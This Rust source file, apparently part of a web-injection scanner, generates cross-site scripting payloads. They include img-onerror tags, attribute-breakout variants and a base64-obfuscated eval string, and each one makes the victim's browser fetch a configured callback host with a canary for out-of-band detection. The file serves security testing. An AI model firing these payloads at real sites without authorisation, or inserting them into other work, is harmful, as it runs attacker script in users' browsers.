use super::Injector;
use base64::prelude::*;

pub fn inj(inj: &Injector, mut ith: u64, n: u64) -> Result<Vec<u8>, u64> {
    if let Some(addr) = &inj.addr() {
        if ith == n && inj.use_https {
            let mut out = b"<img src=x onerror=\"fetch('https://".to_vec();
            out.extend(addr);
            out.extend(b"/");
            out.extend(inj.canary(ith));
            out.extend(b"').then(r=>r.text())\"/>");
            return Ok(out);
        }
        ith += 1;
        if ith == n && inj.use_http {
            let mut out = b"<img src=x onerror=\"fetch('http://".to_vec();
            out.extend(addr);
            out.extend(b"/");
            out.extend(inj.canary(ith));
            out.extend(b"').then(r=>r.text())\"/>");
            return Ok(out);
        }
        ith += 1;
        if ith == n && inj.use_https {
            let mut out = b"\"><img src=x onerror=\"fetch('https://".to_vec();
            out.extend(addr);
            out.extend(b"/");
            out.extend(inj.canary(ith));
            out.extend(b"').then(r=>r.text())\"/>");
            return Ok(out);
        }
        ith += 1;
        if ith == n && inj.use_http {
            let mut out = b"\"><img src=x onerror=\"fetch('http://".to_vec();
            out.extend(addr);
            out.extend(b"/");
            out.extend(inj.canary(ith));
            out.extend(b"').then(r=>r.text())\"/>");
            return Ok(out);
        }
        ith += 1;
        if ith == n && inj.use_http {
            let mut out = b"'+btoa(eval(atob('".to_vec();
            let mut b = b"fetch('http://".to_vec();
            b.extend(addr);
            b.extend(b"/");
            b.extend(inj.canary(ith));
            b.extend(b"').then(r=>r.text())");
            out.extend(BASE64_STANDARD.encode(b).as_bytes());
            out.extend(b"')))+'");
            return Ok(out);
        }
        ith += 1;
        if ith == n && inj.use_https {
            let mut out = b"'+btoa(eval(atob('".to_vec();
            let mut b = b"fetch('https://".to_vec();
            b.extend(addr);
            b.extend(b"/");
            b.extend(inj.canary(ith));
            b.extend(b"').then(r=>r.text())");
            out.extend(BASE64_STANDARD.encode(b).as_bytes());
            out.extend(b"')))+'");
            return Ok(out);
        }
        ith += 1;
    }
    Err(ith)
}
